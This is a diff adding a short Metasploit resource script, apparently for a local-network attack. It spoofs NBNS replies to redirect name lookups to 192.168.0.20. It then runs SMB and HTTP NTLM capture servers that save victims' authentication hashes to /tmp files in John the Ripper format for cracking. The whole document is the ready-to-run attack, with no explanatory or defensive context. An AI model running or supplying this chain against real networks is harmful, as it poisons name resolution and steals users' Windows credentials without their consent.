@@ -1,0 +1,12 @@
+use auxiliary/spoof/nbns/nbns_response
+set INTERFACE eth1
+set SPOOFIP 192.168.0.20
+run
+use auxiliary/server/capture/smb
+set JOHNPWFILE /tmp/john_smb
+run
+use auxiliary/server/capture/http_ntlm
+set JOHNPWFILE /tmp/john_http
+set SRVPORT 80
+set URIPATH /
+run
